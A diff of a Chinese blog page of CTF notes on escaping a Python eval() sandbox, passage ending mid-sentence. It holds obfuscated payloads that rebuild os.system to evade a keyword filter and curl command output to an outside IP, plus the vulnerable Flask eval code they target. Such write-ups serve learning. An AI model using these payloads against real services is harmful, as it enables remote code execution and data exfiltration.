@@ -1,6 +1,6 @@
 ﻿---
 title: "搭建服务器"
-lastmod: 2026-06-10T19:09:25+08:00
+lastmod: 2026-06-10T20:51:31+08:00
 draft: false
 ---
 ```bash
@@ -4073,4 +4073,45 @@ str(open('/flag').read())
 用这个可以包含一下，绕过
 也可以`__import__("os").popen("ls").read()`绕过
 ## 432
+`?code=str(__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')('curl http://43.129.80.243/1.php?a=`ls`'))
+`
+这个就是直接带入程序然后直接带出
+```
+__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')
+```
+看一下这个具体在写些什么
+__builtins__：是 Python 的一个内置模块，包含了所有内建函数和对象（如 print, str, dict 等）。它在任何 Python 代码中都可以直接访问
 
+__dict__：这是 Python 对象的一个特殊属性，它是一个字典（dict），存储了该对象（这里是 __builtins__ 模块）的所有属性。键是属性名，值是属性本身
+
+__builtins__.__dict__['__import__']：这部分代码通过字典键值查询的方式，从 __builtins__ 模块中获取了内建函数 __import__。这和直接写 __import__ 是一样的，但更隐蔽
+
+__getattribute__：是 Python 对象的一个方法，用于获取对象的属性。os.__getattribute__('system') 的效果和 os.system 完全一样
+注意一下url在输入的时候会解码，所以可以把这里的%2b也就是+忽略，所以其实shell里面根本就没有获得这个
+```python
+from flask import Flask
+from flask import request
+import re
+
+app = Flask(__name__)
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	reg = re.compile(r'os|open|system|read|eval')
+    	if reg.search(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+这个就是网站的源代码，发现这里把match从头匹配换成了search全局匹配，所以之前这种方式过不了
+## 433
+
+先尝试一下上一道题目的payload
+发现builtins被禁用了
+直接用import，但是用str包裹一下
+`?code=str(__import__('o'%2b's').__getattribute__('sys'%2b'tem')('curl 43.129.80.243/1.php?a=`ls`'))`
+str的作用是把结果转换成字符串
+其实用不用str都能外带出来结果，区别就是
